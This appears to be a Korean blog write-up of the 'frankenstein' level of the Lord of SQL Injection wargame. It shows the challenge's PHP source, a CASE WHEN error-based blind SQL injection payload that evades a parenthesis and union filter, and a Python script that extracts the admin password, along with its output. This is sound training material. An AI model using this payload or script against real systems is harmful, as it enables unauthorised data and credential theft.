@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - frankenstein 문제풀이 | mingzzi</title>
+	<meta name="description" content="용 시리즈 끝났더니 너무 어렵다 ㅠㅠ물론 풀타임으로 계속 고민하진 않았지만 이거 푸는데 너무 오래걸렸다.드디어 풀었다!">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2018/09/14/los-frankenstein.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - frankenstein 문제풀이</h1>
+    
+    <p class="meta">
+      September 14, 2018
+      
+    </p>
+  </header>
+  <section class="post-content"><p>용 시리즈 끝났더니 너무 어렵다 ㅠㅠ</p>
+
+<p>물론 풀타임으로 계속 고민하진 않았지만 이거 푸는데 너무 오래걸렸다.</p>
+
+<p>드디어 풀었다!</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------------------------------------------------------------------------------------------------------
+query : select id,pw from prob_frankenstein where id='frankenstein' and pw=''
+---------------------------------------------------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(|\)|union/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id,pw from prob_frankenstein where id='frankenstein' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">())</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"error"</span><span class="p">);</span>
+
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from prob_frankenstein where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"frankenstein"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>문제 보자마자 읭? 했다.</p>
+
+<p>일단 괄호가 다 필터링 되어있다.</p>
+
+<p>근데 <code class="highlighter-rouge">error</code>를 뱉어주니, <code class="highlighter-rouge">Error Based Blind SQL Injection</code> 같은데, 문제는 <code class="highlighter-rouge">union</code>도 필터링 되어 있기 때문에 이 전에 문제를 풀기 위해 사용했던 서브쿼리에서 오류 발생시키기 방법을 사용하지 못한다는 거다.</p>
+
+<p>일단 초점은 맞췄던 것은 <code class="highlighter-rouge">조건문을 쓰는데 괄호 없이 어떻게 사용하는가!</code> 였다.</p>
+
+<p>서브쿼리를 괄호 없이 쓰는 법이 있나… 좀 오래 고민했는데, 다 풀고나니 내가 MySQL 문법만 제대로 알았더라도 이미 풀고도 남았던 문제였다.</p>
+
+<p><del>바보 인증 또함</del></p>
+
+<p>내가 사용한 문법은 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>case when 조건 then 참일 때 else 거짓일 때 end
+</code></pre></div></div>
+
+<p>이렇게 하면 괄호 없이도 조건문을 사용할 수 있다.</p>
+
+<p>사실 이거 한참 전에 한번 시도해 봤던 문법인데, 뒤에 <code class="highlighter-rouge">end</code>를 붙여야 한다는 사실을 몰랐다.</p>
+
+<p>그래서 뭘 해도 오류가 나길래 <code class="highlighter-rouge">아 이거 안되는 건가보다</code> 이러고 넘겼는데, 오늘 다시 인터넷에 찾아보니 뒤에 <code class="highlighter-rouge">end</code>가 있더라.</p>
+
+<p><code class="highlighter-rouge">혹시나...?</code> 하고 뒤에 <code class="highlighter-rouge">end</code>를 붙여서 내 서버에서 테스트 해 보니 매우 잘ㅋ됨ㅋ</p>
+
+<p>뭔가 갑자기 신나져서 막 코드 짜서 바로 돌려보았다.</p>
+
+<p>그랬더니 <code class="highlighter-rouge">pw</code> 값을 얻을 수 있었다.</p>
+
+<p>문제를 풀기 위해서 사용한 전체 쿼리는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pw=1' or case when id='admin' and pw like 'a%' then 9e307*2 else 0 end#
+</code></pre></div></div>
+
+<p>이러면 만약 <code class="highlighter-rouge">id='admin' and pw like 'a%'</code>가 참일 경우에는 <code class="highlighter-rouge">9e307*2</code>가 실행되고 아닐 경우에는 <code class="highlighter-rouge">0</code>을 실행한다.</p>
+
+<p>그런데 <code class="highlighter-rouge">9e307*2</code>는 MySQL에서 <code class="highlighter-rouge">ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'</code>라는 오류를 준다.</p>
+
+<p>때문에 문제에서는 <code class="highlighter-rouge">error</code>만을 출력한 후 <code class="highlighter-rouge">exit</code> 하게 된다.</p>
+
+<p><code class="highlighter-rouge">pw like 'a%'</code>는 이 전에도 한번 사용한 적이 있는데, <code class="highlighter-rouge">like</code>을 사용 할 경우 정규표현식 처럼 사용할 수 있다.</p>
+
+<p><code class="highlighter-rouge">%</code>가 <code class="highlighter-rouge">모든 문자</code>를 의미하기 때문에 <code class="highlighter-rouge">a%</code>라고 하면 <code class="highlighter-rouge">a로 시작하고 뒤에 어떤 문자열이라도 붙어 있는 경우</code>를 체크한다.</p>
+
+<p>즉 <code class="highlighter-rouge">pw='a%'</code>는 <code class="highlighter-rouge">apple</code>, <code class="highlighter-rouge">abc</code> 모두 참이 나온다.</p>
+
+<p>이를 바탕으로 코드를 짜면 아래와 같다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://los.rubiya.kr/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw="</span>
+<span class="n">session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">"YOUR SESSION ID"</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"[+] Start"</span>
+
+<span class="k">print</span> <span class="s">"[+] Find password"</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">):</span>
+	<span class="n">found</span> <span class="o">=</span> <span class="bp">False</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or case when id='admin' and pw like '"</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span>  <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="si">%</span><span class="s">' then 9e307*2 else 0 end</span><span class="si">%23</span><span class="s">"</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+		<span class="k">except</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+			<span class="k">continue</span>
+
+		<span class="k">if</span> <span class="s">'&lt;br&gt;error'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+			<span class="k">print</span> <span class="s">"[+] Found"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span>
+			<span class="n">found</span> <span class="o">=</span> <span class="bp">True</span>
+			<span class="k">break</span>
+	<span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+		<span class="k">print</span> <span class="s">"[+] Found password finished"</span>
+		<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found password : "</span><span class="p">,</span> <span class="n">flag</span>
+<span class="k">print</span> <span class="s">"[+] End"</span>
+</code></pre></div></div>
+
+<p>그 결과 아래와 같이 무려 <code class="highlighter-rouge">한번에!</code> 값을 구할 수 있었다.</p>
+
+<p>좀 간만에 오류 없이 한방에 나와서 기분이 좋았다.</p>
+
+<p>아 아니구나 <code class="highlighter-rouge">두 번 만에</code> 나왔다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python ex.py 
+[+] Start
+[+] Find password
+[+] Found 1 : 0
+[+] Found 2 : 0D
+[+] Found 3 : 0DC
+[+] Found 4 : 0DC4
+[+] Found 5 : 0DC4E
+[+] Found 6 : 0DC4EF
+[+] Found 7 : 0DC4EFB
+[+] Found 8 : 0DC4EFBB
+[+] Found password finished
+[+] Found password :  0DC4EFBB
+[+] End
+</code></pre></div></div>
+
+<p>이번에도 소문자로 입력하면 된다.</p>
+
+<p>아예 비교하는 대상 문자열을 내가 알파벳 소문자로 두면 될텐데 뭔가 귀찮아서 걍 <code class="highlighter-rouge">아스키코드 숫자 ~ 문자</code> 범위로 하다보니 맨날 대문자가 먼저 나온다.</p>
+
+<p>언젠간 고치겠지 뭐…</p>
+
+<p>아래처럼 입력하면 문제를 풀 수 있다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pw=0dc4efbb
+</code></pre></div></div>
+
+<p>씐난다!</p>
+
+<p>기분 좋게 집 갈 수 있다!</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>------------------------------------------------------------------------------------------------------------------------
+query : select id,pw from prob_frankenstein where id='frankenstein' and pw='0dc4efbb'
+------------------------------------------------------------------------------------------------------------------------
+
+FRANKENSTEIN Clear!
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(|\)|union/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id,pw from prob_frankenstein where id='frankenstein' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">())</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"error"</span><span class="p">);</span>
+
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from prob_frankenstein where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"frankenstein"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">FRANKENSTEIN Clear!!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2018/09/14/los-frankenstein.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/09/09/los-blue_dragon.html">
+        [Lord of SQL Injection] LoS - blue_dragon 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/09/16/los-phantom.html">
+        [Lord of SQL Injection] LoS - phantom 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
